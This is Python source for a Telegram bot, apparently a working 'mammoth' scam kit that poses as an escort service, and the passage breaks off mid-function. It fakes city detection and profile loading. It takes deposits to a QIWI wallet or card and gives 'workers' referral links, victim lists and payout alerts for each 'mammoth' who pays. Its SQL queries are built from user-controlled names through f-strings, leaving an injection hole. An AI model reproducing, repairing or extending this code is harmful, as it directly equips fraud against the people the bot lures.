# -*- coding: utf8 -*-
import random
from datetime import time
from random import randint
import string
import telebot
import time
from telebot import types
from telebot.types import InputMediaPhoto
import requests
import sqlite3
import json
import os
from PIL import Image
from config import token, admin, vxodadmin, vxodworker, maxpromo, minimalka, maximalka, zalety, bot_username, nicknameqiwi
from buttons import b0, b1, b2, b3, b4, b5, b6, b7, b8, b9, b10, b11, b12, b13, b14, b16, b17, b18, b19, b20, b22, \
	otzivi, b112
from buttons import userpanel, menu, empty, cancel, bal
from answers import a0, a1, a11, a19, skolkochasov, a112

bot = telebot.TeleBot(token)

con = sqlite3.connect("data.db")
cur = con.cursor()
cur.execute('''CREATE TABLE if not exists sposobaoplaty(number int)''')
con.commit()

con = sqlite3.connect("data.db")
cur = con.cursor()
cur.execute('''CREATE TABLE if not exists card(num int)''')
con.commit()

con = sqlite3.connect("data.db")
cur = con.cursor()
cur.execute('''CREATE TABLE if not exists oplatac(n int,id int,summ int)''')
con.commit()

con = sqlite3.connect("data.db")
cur = con.cursor()
cur.execute('''CREATE TABLE if not exists qiwi(num int,token text)''')
con.commit()

con = sqlite3.connect("data.db")
cur = con.cursor()
cur.execute(f"select count(*) from card")
if cur.fetchone()[0] == 0:
	con.commit()
	con = sqlite3.connect("data.db")
	cur = con.cursor()
	cur.execute(f"INSERT INTO card (num) "
				f"VALUES ({7777777777})")
	con.commit()

con = sqlite3.connect("data.db")
cur = con.cursor()
cur.execute(f"select count(*) from qiwi")
if cur.fetchone()[0] == 0:
	con.commit()
	con = sqlite3.connect("data.db")
	cur = con.cursor()
	cur.execute(f"INSERT INTO qiwi (num,token) "
				f"VALUES ({7777777777},\'{'default'}\')")
	con.commit()

con = sqlite3.connect("data.db")
cur = con.cursor()
cur.execute(f"select count(*) from sposobaoplaty")
if cur.fetchone()[0] == 0:
	con.commit()
	con = sqlite3.connect("data.db")
	cur = con.cursor()
	cur.execute(f"INSERT INTO sposobaoplaty (number) "
				f"VALUES ({1})")
	con.commit()


@bot.message_handler(commands=['start'])
def send_welcome(message):
	con = sqlite3.connect("data.db")
	cur = con.cursor()
	cur.execute(f"select count(*) from users where id = {message.chat.id}")
	if cur.fetchone()[0] == 0:
		con.commit()
		ref = message.text
		if len(ref) != 6:
			try:
				ref = int(ref[7:])
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select count(*) from users where id = {ref}")
				if cur.fetchone()[0] != 0:
					con.commit()
					boss = ref
				else:
					con.commit()
					boss = admin

			except:
				boss = admin
		else:
			boss = admin
		id = message.chat.id
		name = (f"{message.chat.first_name} {'|'} {message.chat.last_name}")
		referals = 0
		user_name = message.chat.username
		con = sqlite3.connect("data.db")
		cur = con.cursor()
		cur.execute(f"INSERT INTO users (id,name,referals,boss, username,photoid,balance) "
					f"VALUES ({id},\"{name}\",{referals},{boss}, \"{user_name}\",{1},{0})")
		con.commit()

		con = sqlite3.connect("data.db")
		cur = con.cursor()
		cur.execute(f"SELECT referals FROM users WHERE id = {boss}")
		referal = cur.fetchone()[0]
		referals = referal + 1
		con.commit()
		con = sqlite3.connect("data.db")
		cur = con.cursor()
		cur.execute(f"UPDATE users SET referals = {referals} WHERE id = {boss}")
		con.commit()

		goroda = types.ReplyKeyboardMarkup(resize_keyboard=True)
		button_location = types.KeyboardButton("Определить город📍", request_location=True)
		button_manual = types.KeyboardButton("Ввести город вручную✍🏻")
		goroda.add(button_location, button_manual)

		bot.send_message(message.chat.id, f"🤗 Добро пожаловать, {message.chat.first_name}\nНажмите Определить город📍 или Ввести город вручную✍🏻",
                     reply_markup=goroda)
		
		bot.send_message(boss, f"У вас новый 🐘Мамонт [{message.chat.first_name}](tg://user?id={message.chat.id})",
						 parse_mode='Markdown')
		
	else:
			con.commit()
			stickers = ['CAACAgIAAxkBAAEBM-BggrHread3F142tJYnOpKTKVc3tQACDQEAAladvQpG_UMdBUTXlx8E',
					'CAACAgIAAxkBAAEBM91ggrHl8_4xhl-e-jlNJZ-Rtn0SOAACBAEAAladvQreBNF6Zmb3bB8E',
					'CAACAgEAAxkBAAEBM9pggrHeNPDgVQ6SCQU50Ov3aVqOcgACxAUAAr-MkAR0SG3e07gfIx8E',
					'CAACAgIAAxkBAAEBM9dggrHTRqI0l7kR8OVad9dQr-EZwwACSwMAArVx2gZu3ktViH-zcB8E',
					'CAACAgIAAxkBAAEBM9RggrHHuUf7jO5Yotr1SBuyPrJamAACBAEAAladvQreBNF6Zmb3bB8E',
					'CAACAgIAAxkBAAEBM9FggrG-pw9xOsrsTbAHLn-58dQ3swACbwADWbv8JTcoYHK3J9txHwQ',
					'CAACAgIAAxkBAAEBM85ggrG3lrLUSUCl1FD1XRyB9laN4QACWgUAAj-VzAobFrmFvSDDnR8E',
					'CAACAgIAAxkBAAEBM-NggrNIEd1KFDyEqvHr0ZYeV5txAAPPAAP3AsgPufg4-6cYrv0fBA']

			bot.send_sticker(message.chat.id, random.choice(stickers), reply_markup=userpanel())
	
@bot.message_handler(content_types=['location'])
def handle_location(message):
    bot.send_message(message.chat.id, "Загружаю анкеты...")
    simulate_loading(message)
    bot.send_message(message.chat.id, "✅Город установлен\n📋Список анкет вашего города загружен\n🦋Притяного отдыха с Escort", reply_markup=userpanel())

@bot.message_handler(func=lambda message: message.text == "Ввести город вручную✍🏻")
def handle_manual_city(message):
    bot.send_message(message.chat.id, "🏙 Введите ваш город:")
    bot.register_next_step_handler(message, process_manual_city)

def process_manual_city(message):
    city = message.text

    # Загрузить список разрешенных городов из файла
    with open("allowed_cities.txt", "r", encoding="utf-8") as file:
        allowed_cities = [line.strip() for line in file]

    if city in allowed_cities:
        bot.send_message(message.chat.id, "Загружаю анкеты...")
        simulate_loading(message)  # Симулируем загрузку
        bot.send_message(message.chat.id, "✅Город установлен\n📋Список анкет вашего города загружен\n🦋Притяного отдыха с Escort", reply_markup=userpanel())
    else:
        bot.send_message(message.chat.id, "❌Город не установлен. Введите ваш город еще раз!")
        bot.register_next_step_handler(message, process_manual_city)
def simulate_loading(message):
    total_requests = 2  # Устанавливаем общее количество запросов в 2
    duration = 3  # Устанавливаем желаемую продолжительность загрузки в 5 секунд

    delay = duration / total_requests  # Вычисляем задержку между запросами

    for i in range(1, total_requests + 1):
        bot.send_chat_action(message.chat.id, "typing")
        progress = i / total_requests * 100
        time.sleep(delay)  # Используем вычисленную задержку

@bot.message_handler(content_types=['text'])
def main_message(message):
	if message.text == b0:
		markup = types.InlineKeyboardMarkup()
		button1 = types.InlineKeyboardButton("Связаться с тех.поддержкой", url='Линк на тех поодержку')
		markup.add(button1)
		bot.send_message(message.chat.id, a0, reply_markup=markup)
	elif message.text == b1:
		try:

			keyboard = types.InlineKeyboardMarkup()
			q1 = types.InlineKeyboardButton(text=b14, callback_data="vybor")
			q3 = types.InlineKeyboardButton(text=b16, callback_data="prew")
			q4 = types.InlineKeyboardButton(text=b17, callback_data="next")
			keyboard.add(q1)
			keyboard.add(q3, q4)

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select count(*) from ancety where status = {1}")
			dostup = cur.fetchone()[0]
			con.commit()

			if dostup == 0:
				bot.send_message(message.chat.id, "Анкеты пока не доступны")
			else:

				bot.send_message(message.chat.id, a1, reply_markup=menu())
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select photoid from users where id = {message.chat.id}")
				imgid = cur.fetchone()[0]
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select status from ancety where id = {imgid}")
				stat = cur.fetchone()[0]
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select count(*) from ancety")
				counta = cur.fetchone()[0]
				con.commit()

				if imgid > counta:
					imgid = 1

				while stat == 0:
					imgid += 1
					if imgid > counta:
						imgid = 1
					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"select status from ancety where id = {imgid}")
					stat = cur.fetchone()[0]
					con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select mainphoto from ancety where id = {imgid}")
				img = cur.fetchone()[0]
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select name from ancety where id = {imgid}")
				aname = cur.fetchone()[0]
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select cena from ancety where id = {imgid}")
				acena = cur.fetchone()[0]
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select about from ancety where id = {imgid}")
				aabout = cur.fetchone()[0]
				con.commit()

				texttext = f"🦋 Имя: {aname}\n\n💰  Цена за час: {acena}\n\n❗️ Описание: {aabout}"

				imglink = f"images/{img}"
				photo = open(imglink, 'rb')
				bot.send_photo(message.chat.id, photo, caption=texttext, reply_markup=keyboard)
		except Exception as e:
			raise


	elif message.text == b2:
		con = sqlite3.connect("data.db")
		cur = con.cursor()
		cur.execute(f"select balance from users where id = {message.chat.id}")
		bn = cur.fetchone()[0]
		con.commit()
		bot.send_message(message.chat.id, f"🏦 Ваш персональный кошелек\n\nНа вашем счету: {bn}₽", reply_markup=bal())
		bot.register_next_step_handler(message, balik)
	elif message.text == b3:

		bot.send_message(message.chat.id, "ℹ️ Отправьте ваш промокод", reply_markup=cancel())
		bot.register_next_step_handler(message, promo)
	elif message.text == b4:
		bot.send_message(message.chat.id, b4)
	elif message.text == b11:

		bot.send_message(message.chat.id, a11, reply_markup=userpanel())
	elif message.text == vxodadmin and message.chat.id == admin:
		adm = types.InlineKeyboardMarkup()
		adm1 = types.InlineKeyboardButton(text=b4, callback_data="qiwi")
		adm9 = types.InlineKeyboardButton(text="Изменить карту", callback_data="cardcard")
		adm10 = types.InlineKeyboardButton(text="Изменить платежку", callback_data="platejka")
		adm2 = types.InlineKeyboardButton(text=b5, callback_data="stat")
		adm3 = types.InlineKeyboardButton(text=b6, callback_data="send")
		adm8 = types.InlineKeyboardButton(text="Список анкет", callback_data="spisoka")
		adm4 = types.InlineKeyboardButton(text=b9, callback_data="addancete")
		adm7 = types.InlineKeyboardButton(text=b22, callback_data="addphoto")
		adm5 = types.InlineKeyboardButton(text=b10, callback_data="deleteancete")
		adm6 = types.InlineKeyboardButton(text=b7, callback_data="esc")
		adm.add(adm1)
		adm.add(adm9)
		adm.add(adm10)
		adm.add(adm2)
		adm.add(adm3)
		adm.add(adm8)
		adm.add(adm4)
		adm.add(adm7)
		adm.add(adm5)
		adm.add(adm6)
		bot.send_message(message.chat.id, "Админ панель⚙️", reply_markup=adm)
	elif message.text == vxodworker:
		wrk = types.InlineKeyboardMarkup()
		wrk1 = types.InlineKeyboardButton(text=b8, callback_data="ref")
		wrk5 = types.InlineKeyboardButton(text="Сообщение мамонту", callback_data="smsmamont")
		wrk2 = types.InlineKeyboardButton(text=b18, callback_data="prom")
		wrk4 = types.InlineKeyboardButton(text=b5, callback_data="statw")
		wrk3 = types.InlineKeyboardButton(text=b11, callback_data="menu")

		wrk.add(wrk1)
		wrk.add(wrk5)
		wrk.add(wrk2)
		wrk.add(wrk4)
		wrk.add(wrk3)
		bot.send_message(message.chat.id, "Воркер панель⚙️", reply_markup=wrk)
	elif message.text == b19:
		markup = types.InlineKeyboardMarkup()
		button1 = types.InlineKeyboardButton("Отзывы 💬", url='https://example.com')
		button2 = types.InlineKeyboardButton("Гарантии 🛡", url='https://example.com')
		markup.add(button1, button2)
		bot.send_message(message.chat.id, a19, reply_markup=markup)
	elif message.text == b112:
		bot.send_message(message.chat.id, a112)
	elif message.text == b20:
		bot.send_message(message.chat.id, "Отменено", reply_markup=userpanel())


@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
	keyboard = types.InlineKeyboardMarkup()
	q1 = types.InlineKeyboardButton(text=b14, callback_data="vybor")
	q3 = types.InlineKeyboardButton(text=b16, callback_data="prew")
	q4 = types.InlineKeyboardButton(text=b17, callback_data="next")
	keyboard.add(q1)
	keyboard.add(q3, q4)

	adm = types.InlineKeyboardMarkup()
	adm1 = types.InlineKeyboardButton(text=b4, callback_data="qiwi")
	adm9 = types.InlineKeyboardButton(text="Изменить карту", callback_data="cardcard")
	adm10 = types.InlineKeyboardButton(text="Изменить платежку", callback_data="platejka")
	adm2 = types.InlineKeyboardButton(text=b5, callback_data="stat")
	adm3 = types.InlineKeyboardButton(text=b6, callback_data="send")
	adm8 = types.InlineKeyboardButton(text="Список анкет", callback_data="spisoka")
	adm4 = types.InlineKeyboardButton(text=b9, callback_data="addancete")
	adm7 = types.InlineKeyboardButton(text=b22, callback_data="addphoto")
	adm5 = types.InlineKeyboardButton(text=b10, callback_data="deleteancete")
	adm6 = types.InlineKeyboardButton(text=b7, callback_data="esc")
	adm.add(adm1)
	adm.add(adm9)
	adm.add(adm10)
	adm.add(adm2)
	adm.add(adm3)
	adm.add(adm8)
	adm.add(adm4)
	adm.add(adm7)
	adm.add(adm5)
	adm.add(adm6)
	if call.message:
		if call.data == "next":
			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select photoid from users where id = {call.message.chat.id}")
			imgid = cur.fetchone()[0]
			con.commit()
			imgid += 1

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select count(*) from ancety")
			counta = cur.fetchone()[0]
			con.commit()

			if imgid > counta:
				imgid = 1

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select status from ancety where id = {imgid}")
			stat = cur.fetchone()[0]
			con.commit()

			while stat == 0:
				imgid += 1
				if imgid > counta:
					imgid = 1
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select status from ancety where id = {imgid}")
				stat = cur.fetchone()[0]
				con.commit()

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"UPDATE users SET photoid = {imgid} WHERE id = {call.message.chat.id}")
			con.commit()

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select mainphoto from ancety where id = {imgid}")
			img = cur.fetchone()[0]
			con.commit()

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select name from ancety where id = {imgid}")
			aname = cur.fetchone()[0]
			con.commit()

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select cena from ancety where id = {imgid}")
			acena = cur.fetchone()[0]
			con.commit()

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select about from ancety where id = {imgid}")
			aabout = cur.fetchone()[0]
			con.commit()

			texttext = f"🦋 Имя: {aname}\n\n💰  Цена за час: {acena}\n\n❗️ Описание: {aabout}"

			imglink = f"images/{img}"
			photo = open(imglink, 'rb')

			bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id,
								   media=types.InputMediaPhoto(photo), reply_markup=keyboard)
			bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=texttext,
									 reply_markup=keyboard)
		elif call.data == "prew":
			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select photoid from users where id = {call.message.chat.id}")
			imgid = cur.fetchone()[0]
			con.commit()
			imgid -= 1

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select count(*) from ancety")
			counta = cur.fetchone()[0]
			con.commit()

			if imgid < 1:
				imgid = counta

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select status from ancety where id = {imgid}")
			stat = cur.fetchone()[0]
			con.commit()

			while stat == 0:
				imgid -= 1
				if imgid < 1:
					imgid = counta
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select status from ancety where id = {imgid}")
				stat = cur.fetchone()[0]
				con.commit()

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"UPDATE users SET photoid = {imgid} WHERE id = {call.message.chat.id}")
			con.commit()

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select mainphoto from ancety where id = {imgid}")
			img = cur.fetchone()[0]
			con.commit()

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select name from ancety where id = {imgid}")
			aname = cur.fetchone()[0]
			con.commit()

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select cena from ancety where id = {imgid}")
			acena = cur.fetchone()[0]
			con.commit()

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select about from ancety where id = {imgid}")
			aabout = cur.fetchone()[0]
			con.commit()

			texttext = f"🦋 Имя: {aname}\n\n💰 Цена за час: {acena}\n\n❗️ Описание: {aabout}"

			imglink = f"images/{img}"
			photo = open(imglink, 'rb')
			bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id,
								   media=types.InputMediaPhoto(photo), reply_markup=keyboard)
			bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=texttext,
									 reply_markup=keyboard)
		elif call.data == "addancete":
			bot.send_message(call.message.chat.id, "Отправьте главное фото анкеты")
			bot.register_next_step_handler(call.message, newancet)
		elif call.data == "menu":
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
								  text="Воркер панель закрыта")

		elif call.data == "prom":
			bot.send_message(call.message.chat.id, "Напишите на какую сумму создать промокод.")
			bot.register_next_step_handler(call.message, create_promo)
		elif call.data == "esc":
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
								  text="Админ панель закрыта")

		elif call.data == "deleteancete":
			bot.send_message(call.message.chat.id, "Введите номер анкеты который хотите удалить", reply_markup=cancel())
			bot.register_next_step_handler(call.message, otklancete)
		elif call.data == "prov":
			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select number from sposobaoplaty")
			spso = cur.fetchone()[0]
			con.commit()

			if spso == 1:
				user_id = call.message.chat.id

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select num from qiwi")
				qiwinumber = cur.fetchone()[0]
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select token from qiwi")
				token_qiwi = cur.fetchone()[0]
				con.commit()

				QIWI_TOKEN = token_qiwi
				QIWI_ACCOUNT = str(qiwinumber)
				s = requests.Session()
				s.headers['authorization'] = 'Bearer ' + QIWI_TOKEN
				parameters = {'rows': '50'}
				h = s.get('https://edge.qiwi.com/payment-history/v1/persons/' + QIWI_ACCOUNT + '/payments',
						  params=parameters)
				req = json.loads(h.text)
				try:
					cur.execute(f"SELECT * FROM oplata WHERE id = {user_id}")
					result = cur.fetchone()
					comment = str(result[1])

					for x in range(len(req['data'])):

						if req['data'][x]['comment'] == comment:

							skolko = (req['data'][x]['sum']['amount'])
							cur.execute(f"DELETE FROM oplata WHERE id = {user_id}")
							con.commit()

							con = sqlite3.connect("data.db")
							cur = con.cursor()
							cur.execute(f"select balance from users WHERE id = {call.message.chat.id}")
							balancenow = cur.fetchone()[0]
							con.commit()

							con = sqlite3.connect("data.db")
							cur = con.cursor()
							cur.execute(
								f"UPDATE users SET balance = {balancenow + skolko} WHERE id = {call.message.chat.id}")
							con.commit()

							cur.execute(f"SELECT boss FROM users WHERE id = {user_id}")

							for worker in cur.execute(f"SELECT boss FROM users WHERE id = {user_id}"):
								wk = worker[0]
							cur.execute(f"SELECT username FROM users WHERE id = {wk}")

							for username in cur.execute(f"SELECT username FROM users WHERE id = {wk}"):
								workerusername = username[0]
							for name in cur.execute(f"SELECT name FROM users WHERE id = {wk}"):
								workername = name[0]

							con = sqlite3.connect("data.db")
							cur = con.cursor()
							cur.execute(f"select name from users where id = {call.message.chat.id}")
							mamont = cur.fetchone()[0]
							con.commit()

							bot.send_message(zalety,
											 f"🦋 Успешное пополнение 🦋\n\n💵 Сумма: {skolko}₽\n💼 Работник: @{workerusername}")
							bot.send_message(admin,
											 f"[{call.message.chat.first_name}](tg://user?id={call.message.chat.id}) пополнил баланс на {skolko}₽",
											 parse_mode='Markdown')
							bot.send_message(wk,
											 f"Ваш мамонт: [{call.message.chat.first_name}](tg://user?id={call.message.chat.id}) пополнил баланс на {skolko}₽",
											 parse_mode='Markdown')
							cur.execute(f"UPDATE users SET balance = {balancenow + skolko} WHERE id = {call.message.chat.id}")
							con.commit()

							# Отправка сообщения пользователю
							bot.send_message(call.message.chat.id, f"💸 Ваш баланс пополнен.\n\nБаланс {balancenow + skolko}₽", reply_markup=userpanel())

							break
						else:
							bot.send_message(call.message.chat.id,
											 "⚠️Вы не оплатили⚠️\n\nОплатите заказ после чего нажмите \"Проверить оплату\"")

							break

				except:
					pass
			else:
				try:

					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"SELECT summ FROM oplatac where id = {call.message.chat.id}")
					sa = cur.fetchone()[0]
					con.commit()

					k = types.InlineKeyboardMarkup()
					k1 = types.InlineKeyboardButton(text="Выплатить", callback_data="vyplata")
					k2 = types.InlineKeyboardButton(text="Отклонить", callback_data="otklon")

					k.add(k1)
					k.add(k2)
					bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
										  text="💸 Ваш платеж обрабатывается вручную.\n\nℹ️ Чтобы ускорить процесс проверки, свяжитесь с администрацией Линк на тех поддержку и предоставьте чек.")
					bot.send_message(call.message.chat.id, f"Вы вернулись в главное меню", reply_markup=userpanel())

					bot.send_message(admin,
									 f"ID платежа `{call.message.chat.id}`\nПользователь {call.message.chat.first_name} Запросил проверку платежа.\nСумма {sa}",
									 reply_markup=k, parse_mode='Markdown')


				except:
					pass
		elif call.data == "vyplata":
			bot.send_message(call.message.chat.id, f"Напишите айди платежа", reply_markup=cancel())
			bot.register_next_step_handler(call.message, prinyatieplateja)

		elif call.data == "otklon":
			bot.send_message(call.message.chat.id, f"Напишите айди платежа", reply_markup=cancel())
			bot.register_next_step_handler(call.message, otklonplateja)

		elif call.data == "stat":
			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"SELECT COUNT (*) FROM users")
			number = cur.fetchone()[0]
			con.commit()
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
								  text=f"Всего пользователей в боте - {number}")
			bot.send_message(call.message.chat.id, "Админ панель", reply_markup=adm)
		elif call.data == "vkl":
			try:
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select count(*) from ancety")
				c = cur.fetchone()[0]
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()

				cur.execute(f"UPDATE ancety SET status = {1} WHERE id = {c}")
				con.commit()
				bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
									  text="Анкета включена")

			except Exception as e:
				raise
		elif call.data == "otkl":
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
								  text="Анкета отключена")
			bot.register_next_step_handler(call.message, main_message)
		elif call.data == "ref":
			reflnk = f"https://t.me/{bot_username}?start={call.message.chat.id}"
			otvet_ref = f"Ваша реф ссылка {reflnk}"
			bot.send_message(call.message.chat.id, otvet_ref)
		elif call.data == "qiwi":
			bot.send_message(call.message.chat.id,
							 "Отправьте номер кошелька(без + а) и токен в формате  номер:токен\n\nПример 7916123456:s132sdfsdf21s5f6sdf1s3s3dfs132",
							 reply_markup=cancel())
			bot.register_next_step_handler(call.message, replaceqiwi)
		elif call.data == "send":

			bot.send_message(call.message.chat.id, "Напишите текст для расылки", reply_markup=cancel())
			bot.register_next_step_handler(call.message, rass)
		elif call.data == "vybor":

			bot.send_message(call.message.chat.id, skolkochasov, reply_markup=cancel())
			bot.register_next_step_handler(call.message, chas)
		elif call.data == "addphoto":
			bot.send_message(call.message.chat.id, "Напишите номер анкеты к которому хотите добавить фотографии",
							 reply_markup=cancel())
			bot.register_next_step_handler(call.message, addp)
		elif call.data == "photos":
			try:
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"SELECT photoid from users where id = {call.message.chat.id}")
				pi = cur.fetchone()[0]
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select count(*) from photos where anceta = {pi}")
				allp = cur.fetchone()[0]
				con.commit()

				if allp == 0:
					bot.send_message(call.message.chat.id, "Больше фотографии нету.")

				else:
					con = sqlite3.connect("data.db")
					cur = con.cursor()

					cur.execute(f"SELECT image FROM photos where anceta = {pi}")
					id = cur.fetchall()
					con.commit()

					con = sqlite3.connect("data.db")
					cur = con.cursor()

					cur.execute(f"SELECT mainphoto FROM ancety where id = {pi}")
					mi = f"images/{cur.fetchone()[0]}"
					con.commit()
					mip = open(mi, 'rb')
					bot.delete_message(call.message.chat.id, call.message.message_id)

					# bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id,media=types.InputMediaPhoto(mip))
					arr = []
					for i in id:
						try:
							arr.append(InputMediaPhoto(open(f"images/{i[0]}", 'rb')))

						# photo = open(imglink, 'rb')


						except:
							pass

					bot.send_media_group(call.message.chat.id, arr)

					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"select mainphoto from ancety where id = {pi}")
					img = cur.fetchone()[0]
					con.commit()

					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"select name from ancety where id = {pi}")
					aname = cur.fetchone()[0]
					con.commit()

					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"select cena from ancety where id = {pi}")
					acena = cur.fetchone()[0]
					con.commit()

					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"select about from ancety where id = {pi}")
					aabout = cur.fetchone()[0]
					con.commit()

					texttext = f"🦋 Имя: {aname}\n\n💰Цена за час: {acena}\n\n❗️ Описание: {aabout}"

					imglink = f"images/{img}"
					photo = open(imglink, 'rb')
					bot.send_photo(call.message.chat.id, photo, caption=texttext, reply_markup=keyboard)

			except Exception as e:
				bot.send_message(call.message.chat.id, e)
		elif call.data == "statw":

			wrk = types.InlineKeyboardMarkup()
			wrk1 = types.InlineKeyboardButton(text=b8, callback_data="ref")
			wrk5 = types.InlineKeyboardButton(text="Сообщение мамонту", callback_data="smsmamont")
			wrk2 = types.InlineKeyboardButton(text=b18, callback_data="prom")
			wrk4 = types.InlineKeyboardButton(text=b5, callback_data="statw")
			wrk3 = types.InlineKeyboardButton(text=b11, callback_data="menu")

			wrk.add(wrk1)
			wrk.add(wrk5)
			wrk.add(wrk2)
			wrk.add(wrk4)
			wrk.add(wrk3)
			con = sqlite3.connect("data.db")
			cur = con.cursor()

			cur.execute(f"SELECT id FROM users where boss = {call.message.chat.id}")
			wstat = cur.fetchall()
			con.commit()

			strw = "🐘 Твои Мамонты 🐘\n\n"
			countstrw = len(wstat) // 50
			arrstatw = []

			for i in wstat:
				try:
					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"SELECT name FROM users where id = {i[0]}")
					statwname = cur.fetchone()[0]
					con.commit()

					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"SELECT username FROM users where id = {i[0]}")
					statwusername = cur.fetchone()[0]
					con.commit()

					imya = statwname.split("|")

					strw = f"{i[0]} {imya[0]} {statwusername}\n"
					arrstatw.append(strw)
				except:
					pass

			if (len(arrstatw) > 50):
				for x in range(len(arrstatw)):
					strw += arrstatw[x]
					if x % 50 == 0 or x == len(arrstatw) - 1:
						bot.send_message(call.message.chat.id, f"{strw}")
						strw = "🐘 Твои Мамонты 🐘\n\n"



			else:
				for i in arrstatw:
					strw += i
				bot.send_message(call.message.chat.id, f"{strw}")

			bot.send_message(call.message.chat.id, "Воркер панель⚙️", reply_markup=wrk)

		# bot.send_message(call.message.chat.id, strw,parse_mode='Markdown')

		elif call.data == "gorod":
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="✅Город определён.")
			stickers = ['CAACAgIAAxkBAAEBM-BggrHread3F142tJYnOpKTKVc3tQACDQEAAladvQpG_UMdBUTXlx8E',
						'CAACAgIAAxkBAAEBM91ggrHl8_4xhl-e-jlNJZ-Rtn0SOAACBAEAAladvQreBNF6Zmb3bB8E',
						'CAACAgEAAxkBAAEBM9pggrHeNPDgVQ6SCQU50Ov3aVqOcgACxAUAAr-MkAR0SG3e07gfIx8E',
						'CAACAgIAAxkBAAEBM9dggrHTRqI0l7kR8OVad9dQr-EZwwACSwMAArVx2gZu3ktViH-zcB8E',
						'CAACAgIAAxkBAAEBM9RggrHHuUf7jO5Yotr1SBuyPrJamAACBAEAAladvQreBNF6Zmb3bB8E',
						'CAACAgIAAxkBAAEBM9FggrG-pw9xOsrsTbAHLn-58dQ3swACbwADWbv8JTcoYHK3J9txHwQ',
						'CAACAgIAAxkBAAEBM85ggrG3lrLUSUCl1FD1XRyB9laN4QACWgUAAj-VzAobFrmFvSDDnR8E',
						'CAACAgIAAxkBAAEBM-NggrNIEd1KFDyEqvHr0ZYeV5txAAPPAAP3AsgPufg4-6cYrv0fBA']

			bot.send_sticker(call.message.chat.id, random.choice(stickers), reply_markup=userpanel())
		elif call.data == "spisoka":
			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select id from ancety where status = {1}")
			sp1 = cur.fetchall()
			con.commit()

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select name from ancety where status = {1}")
			sp2 = cur.fetchall()
			con.commit()

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select cena from ancety where status = {1}")
			sp3 = cur.fetchall()
			con.commit()

			res = ""
			for i in range(len(sp1)):
				try:
					res += f"ID: {sp1[i]} Имя: {sp2[i]}  Цена: {sp3[i]}\n"
				except Exception as e:
					raise
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="Список анкет")
			bot.send_message(call.message.chat.id, res, reply_markup=adm)
		elif call.data == "cardcard":
			bot.send_message(call.message.chat.id, "Отправьте номер карты", reply_markup=cancel())
			bot.register_next_step_handler(call.message, replacecard)
		elif call.data == "platejka":
